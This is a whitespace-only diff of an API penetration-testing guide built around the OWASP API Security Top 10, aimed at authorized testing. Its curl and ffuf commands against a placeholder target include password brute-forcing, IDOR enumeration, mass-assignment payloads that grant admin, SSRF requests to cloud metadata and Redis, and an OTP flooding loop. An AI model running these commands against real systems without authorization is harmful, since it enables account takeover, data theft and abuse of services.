@@ -1,9 +1,9 @@
 ---
 name: testing-api-security-with-owasp-top-10
 description: Systematically assesses REST, GraphQL, and gRPC API endpoints against the OWASP
-  API Security Top 10 (2023) using Burp Suite and Postman for automated and manual testing.
-  Use during authorized API penetration tests, before deploying new endpoints to production,
-  or when validating API gateway controls and rate limiting.
+ API Security Top 10 (2023) using Burp Suite and Postman for automated and manual testing.
+ Use during authorized API penetration tests, before deploying new endpoints to production,
+ or when validating API gateway controls and rate limiting.
 domain: cybersecurity
 subdomain: web-application-security
 tags:
@@ -63,26 +63,26 @@ curl -s "https://api.target.example.com/openapi.yaml"
 
 # Fuzz for API endpoints
 ffuf -u "https://api.target.example.com/api/v1/FUZZ" \
-  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
-  -mc 200,201,204,301,401,403,405 \
-  -fc 404 \
-  -H "Content-Type: application/json" \
-  -o api-enum.json -of json
+ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
+ -mc 200,201,204,301,401,403,405 \
+ -fc 404 \
+ -H "Content-Type: application/json" \
+ -o api-enum.json -of json
 
 # Fuzz for API versions
 for v in v1 v2 v3 v4 beta internal admin; do
-  status=$(curl -s -o /dev/null -w "%{http_code}" \
-    "https://api.target.example.com/api/$v/users")
-  echo "$v: $status"
+ status=$(curl -s -o /dev/null -w "%{http_code}" \
+ "https://api.target.example.com/api/$v/users")
+ echo "$v: $status"
 done
 
 # Check for GraphQL endpoint
 for path in graphql graphiql playground query gql; do
-  status=$(curl -s -o /dev/null -w "%{http_code}" \
-    -X POST -H "Content-Type: application/json" \
-    -d '{"query":"{__typename}"}' \
-    "https://api.target.example.com/$path")
-  echo "$path: $status"
+ status=$(curl -s -o /dev/null -w "%{http_code}" \
+ -X POST -H "Content-Type: application/json" \
+ -d '{"query":"{__typename}"}' \
+ "https://api.target.example.com/$path")
+ echo "$path: $status"
 done
 ```
 
@@ -94,17 +94,17 @@ Test whether users can access objects belonging to other users by manipulating I
 # Authenticate as User A and get their resources
 TOKEN_A="Bearer eyJhbGciOiJIUzI1NiIs..."
 curl -s -H "Authorization: $TOKEN_A" \
-  "https://api.target.example.com/api/v1/users/101/orders" | jq .
+ "https://api.target.example.com/api/v1/users/101/orders" | jq .
 
 # Try accessing User B's resources with User A's token
 curl -s -H "Authorization: $TOKEN_A" \
-  "https://api.target.example.com/api/v1/users/102/orders" | jq .
+ "https://api.target.example.com/api/v1/users/102/orders" | jq .
 
 # Fuzz object IDs with Burp Intruder or ffuf
 ffuf -u "https://api.target.example.com/api/v1/orders/FUZZ" \
-  -w <(seq 1 1000) \
-  -H "Authorization: $TOKEN_A" \
-  -mc 200 -t 10 -rate 50
+ -w <(seq 1 1000) \
+ -H "Authorization: $TOKEN_A" \
+ -mc 200 -t 10 -rate 50
 
 # Test IDOR with different ID formats
 # Numeric: /users/102
@@ -130,15 +130,15 @@ echo "eyJhbGciOiJIUzI1NiIs..." | cut -d. -f2 | base64 -d 2>/dev/null | jq .
 
 # Test brute-force protection on login
 ffuf -u "https://api.target.example.com/api/v1/auth/login" \
-  -X POST -H "Content-Type: application/json" \
-  -d '{"email":"admin@target.com","password":"FUZZ"}' \
-  -w /usr/share/seclists/Passwords/Common-Credentials/top-1000.txt \
-  -mc 200 -t 5 -rate 10
+ -X POST -H "Content-Type: application/json" \
+ -d '{"email":"admin@target.com","password":"FUZZ"}' \
+ -w /usr/share/seclists/Passwords/Common-Credentials/top-1000.txt \
+ -mc 200 -t 5 -rate 10
 
 # Test password reset flow
 curl -s -X POST "https://api.target.example.com/api/v1/auth/reset" \
-  -H "Content-Type: application/json" \
-  -d '{"email":"victim@target.com"}'
+ -H "Content-Type: application/json" \
+ -d '{"email":"victim@target.com"}'
 
 # Check if token is in response body instead of email only
 ```
@@ -150,28 +150,28 @@ Test for excessive data exposure and mass assignment vulnerabilities.
 ```bash
 # Check for excessive data in responses
 curl -s -H "Authorization: $TOKEN_A" \
-  "https://api.target.example.com/api/v1/users/101" | jq .
+ "https://api.target.example.com/api/v1/users/101" | jq .
 # Look for: password hashes, SSNs, internal IDs, admin flags, PII
 
 # Test mass assignment - try adding admin properties
 curl -s -X PUT \
-  -H "Authorization: $TOKEN_A" \
-  -H "Content-Type: application/json" \
-  -d '{"name":"Test User","role":"admin","is_admin":true}' \
-  "https://api.target.example.com/api/v1/users/101" | jq .
+ -H "Authorization: $TOKEN_A" \
+ -H "Content-Type: application/json" \
+ -d '{"name":"Test User","role":"admin","is_admin":true}' \
+ "https://api.target.example.com/api/v1/users/101" | jq .
 
 # Test with PATCH method
 curl -s -X PATCH \
-  -H "Authorization: $TOKEN_A" \
-  -H "Content-Type: application/json" \
-  -d '{"role":"admin","balance":999999}' \
-  "https://api.target.example.com/api/v1/users/101" | jq .
+ -H "Authorization: $TOKEN_A" \
+ -H "Content-Type: application/json" \
+ -d '{"role":"admin","balance":999999}' \
+ "https://api.target.example.com/api/v1/users/101" | jq .
 
 # Check if filtering parameters expose more data
 curl -s -H "Authorization: $TOKEN_A" \
-  "https://api.target.example.com/api/v1/users/101?fields=all" | jq .
+ "https://api.target.example.com/api/v1/users/101?fields=all" | jq .
 curl -s -H "Authorization: $TOKEN_A" \
-  "https://api.target.example.com/api/v1/users/101?include=password,ssn" | jq .
+ "https://api.target.example.com/api/v1/users/101?include=password,ssn" | jq .
 ```
 
 ### Step 5: Test API4/API6 - Rate Limiting and Unrestricted Access to Sensitive Flows
@@ -181,34 +181,34 @@ Verify rate limiting and resource consumption controls.
 ```bash
 # Test rate limiting on authentication endpoint
 for i in $(seq 1 100); do
-  status=$(curl -s -o /dev/null -w "%{http_code}" \
-    -X POST -H "Content-Type: application/json" \
-    -d '{"email":"test@test.com","password":"wrong"}' \
-    "https://api.target.example.com/api/v1/auth/login")
-  echo "Attempt $i: $status"
-  if [ "$status" == "429" ]; then
-    echo "Rate limited at attempt $i"
-    break
-  fi
+ status=$(curl -s -o /dev/null -w "%{http_code}" \
+ -X POST -H "Content-Type: application/json" \
+ -d '{"email":"test@test.com","password":"wrong"}' \
+ "https://api.target.example.com/api/v1/auth/login")
+ echo "Attempt $i: $status"
+ if [ "$status" == "429" ]; then
+ echo "Rate limited at attempt $i"
+ break
+ fi
 done
 
 # Test for unrestricted resource consumption
 # Large pagination
 curl -s -H "Authorization: $TOKEN_A" \
-  "https://api.target.example.com/api/v1/users?limit=100000&offset=0" | jq '. | length'
+ "https://api.target.example.com/api/v1/users?limit=100000&offset=0" | jq '. | length'
 
 # GraphQL depth/complexity attack
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -H "Authorization: $TOKEN_A" \
-  -d '{"query":"{ users { friends { friends { friends { friends { name } } } } } }"}' \
-  "https://api.target.example.com/graphql"
+ -H "Content-Type: application/json" \
+ -H "Authorization: $TOKEN_A" \
+ -d '{"query":"{ users { friends { friends { friends { friends { name } } } } } }"}' \
+ "https://api.target.example.com/graphql"
 
 # Test SMS/email flooding via OTP endpoint
 for i in $(seq 1 20); do
-  curl -s -X POST -H "Content-Type: application/json" \
-    -d '{"phone":"+1234567890"}' \
-    "https://api.target.example.com/api/v1/auth/send-otp"
+ curl -s -X POST -H "Content-Type: application/json" \
+ -d '{"phone":"+1234567890"}' \
+ "https://api.target.example.com/api/v1/auth/send-otp"
 done
 ```
 
@@ -219,31 +219,31 @@ Check for privilege escalation through administrative endpoints.
 ```bash
 # Test admin endpoints with regular user token
 ADMIN_ENDPOINTS=(
-  "/api/v1/admin/users"
-  "/api/v1/admin/settings"
-  "/api/v1/admin/logs"
-  "/api/v1/internal/config"
-  "/api/v1/users?role=admin"
-  "/api/v1/admin/export"
+ "/api/v1/admin/users"
+ "/api/v1/admin/settings"
+ "/api/v1/admin/logs"
+ "/api/v1/internal/config"
+ "/api/v1/users?role=admin"
+ "/api/v1/admin/export"
 )
 
 for endpoint in "${ADMIN_ENDPOINTS[@]}"; do
-  for method in GET POST PUT DELETE; do
-    status=$(curl -s -o /dev/null -w "%{http_code}" \
-      -X "$method" \
-      -H "Authorization: $TOKEN_A" \
-      -H "Content-Type: application/json" \
-      "https://api.target.example.com$endpoint")
-    if [ "$status" != "403" ] && [ "$status" != "401" ] && [ "$status" != "404" ]; then
-      echo "POTENTIAL ISSUE: $method $endpoint returned $status"
-    fi
-  done
+ for method in GET POST PUT DELETE; do
+ status=$(curl -s -o /dev/null -w "%{http_code}" \
+ -X "$method" \
+ -H "Authorization: $TOKEN_A" \
+ -H "Content-Type: application/json" \
+ "https://api.target.example.com$endpoint")
+ if [ "$status" != "403" ] && [ "$status" != "401" ] && [ "$status" != "404" ]; then
+ echo "POTENTIAL ISSUE: $method $endpoint returned $status"
+ fi
+ done
 done
 
 # Test HTTP method switching
 # If GET /admin/users returns 403, try:
 curl -s -X POST -H "Authorization: $TOKEN_A" \
-  "https://api.target.example.com/api/v1/admin/users"
+ "https://api.target.example.com/api/v1/admin/users"
 ```
 
 ### Step 7: Test API7-API10 - SSRF, Misconfiguration, Inventory, and Unsafe Consumption
@@ -251,34 +251,34 @@ curl -s -X POST -H "Authorization: $TOKEN_A" \
 ```bash
 # API7: Server-Side Request Forgery
 curl -s -X POST -H "Authorization: $TOKEN_A" \
-  -H "Content-Type: application/json" \
-  -d '{"url":"http://169.254.169.254/latest/meta-data/"}' \
-  "https://api.target.example.com/api/v1/fetch-url"
+ -H "Content-Type: application/json" \
+ -d '{"url":"http://169.254.169.254/latest/meta-data/"}' \
+ "https://api.target.example.com/api/v1/fetch-url"
 
 curl -s -X POST -H "Authorization: $TOKEN_A" \
-  -H "Content-Type: application/json" \
-  -d '{"webhook_url":"http://127.0.0.1:6379/"}' \
-  "https://api.target.example.com/api/v1/webhooks"
+ -H "Content-Type: application/json" \
+ -d '{"webhook_url":"http://127.0.0.1:6379/"}' \
+ "https://api.target.example.com/api/v1/webhooks"
 
 # API8: Security Misconfiguration
 # Check CORS policy
 curl -s -I -H "Origin: https://evil.example.com" \
-  "https://api.target.example.com/api/v1/users" | grep -i "access-control"
+ "https://api.target.example.com/api/v1/users" | grep -i "access-control"
 
 # Check for verbose error messages
 curl -s -X POST -H "Content-Type: application/json" \
-  -d '{"invalid": "data' \
-  "https://api.target.example.com/api/v1/users"
+ -d '{"invalid": "data' \
+ "https://api.target.example.com/api/v1/users"
 
 # Check security headers
 curl -s -I "https://api.target.example.com/api/v1/health" | grep -iE \
-  "(x-frame|x-content|strict-transport|content-security|x-xss)"
+ "(x-frame|x-content|strict-transport|content-security|x-xss)"
 
 # API9: Improper Inventory Management
 # Test deprecated API versions
 for v in v0 v1 v2 v3; do
-  curl -s -o /dev/null -w "$v: %{http_code}\n" \
-    "https://api.target.example.com/api/$v/users"
+ curl -s -o /dev/null -w "$v: %{http_code}\n" \
+ "https://api.target.example.com/api/$v/users"
 done
 
 # API10: Unsafe Consumption of APIs
